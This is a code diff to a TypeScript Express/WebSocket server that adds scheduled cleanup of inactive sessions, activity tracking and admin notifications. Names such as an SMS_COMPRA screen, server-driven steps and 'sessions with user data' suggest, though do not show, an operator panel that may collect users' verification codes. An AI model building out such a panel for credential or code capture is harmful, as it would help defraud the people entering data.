@@ -875,6 +875,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Tarea programada para limpiar sesiones inactivas (cada 5 minutos)
+  const cleanupInterval = setInterval(async () => {
+    try {
+      console.log("[Cleanup] Ejecutando limpieza programada de sesiones inactivas...");
+      const deletedCount = await storage.cleanupExpiredSessions();
+      
+      if (deletedCount > 0) {
+        console.log(`[Cleanup] Se eliminaron ${deletedCount} sesiones inactivas o expiradas`);
+        
+        // Notificar a todos los clientes de administración
+        broadcastToAdmins(JSON.stringify({
+          type: 'SESSIONS_CLEANUP',
+          data: { 
+            deletedCount,
+            automatic: true,
+            timestamp: new Date().toISOString()
+          }
+        }));
+      }
+    } catch (error) {
+      console.error("[Cleanup] Error en la limpieza automática de sesiones:", error);
+    }
+  }, 5 * 60 * 1000); // Cada 5 minutos (5 * 60 * 1000 ms)
+  
   // WebSocket handling
   wss.on('connection', (ws, req) => {
     console.log('New WebSocket connection');
@@ -1041,6 +1065,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 screenType = ScreenType.SMS_COMPRA;
               }
 
+              // Actualizar la última actividad de la sesión
+              await storage.updateSessionActivity(sessionId);
+              
               await storage.updateSession(sessionId, { pasoActual: screenType });
               console.log('Actualizado pasoActual a:', screenType);
 
@@ -1069,6 +1096,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Validate the data
             const validatedData = clientInputSchema.parse(data.data);
             const { sessionId, tipo, data: inputData } = validatedData;
+            
+            // Actualizar la última actividad de la sesión
+            await storage.updateSessionActivity(sessionId);
+            
+            // Indicar que esta sesión ya tiene datos de usuario (para evitar eliminación automática)
+            await storage.markSessionHasUserData(sessionId);
 
             // Update the session with the new data
             const updatedFields: Record<string, any> = {};
